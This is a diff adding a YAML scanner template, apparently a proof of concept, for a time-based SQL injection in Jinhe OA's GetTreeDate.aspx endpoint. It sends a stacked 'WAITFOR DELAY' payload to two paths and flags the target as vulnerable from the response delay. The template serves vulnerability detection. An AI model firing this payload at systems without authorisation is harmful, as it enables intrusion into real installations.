@@ -1,0 +1,21 @@
+id: poc-yaml-jin-he-oa-gettreedate-aspx-sql-injection
+info:
+  name: 金和OA GetTreeDate.aspx SQL注入漏洞
+  severity: critical
+  tags:
+  - sql-injection
+  finger: 金和OA
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+  paths: 'c6/Jhsoft.Web.Appraise/GetTreeDate.aspx
+
+    C6/Jhsoft.Web.users/GetTreeDate.aspx
+
+    '
+requests:
+- method: GET
+  path: /{{.paths}}/?id=1%3bWAITFOR+DELAY+'0%3a0%3a{{.t1}}'+--%20and%201=1
+  expression: status_code == 200 && contains(body,"\"hasChildren\":") && contains(body,"\"permissions\":")
+    && duration > t1 && duration < t2 && !contains(body,"<")
+transport: http
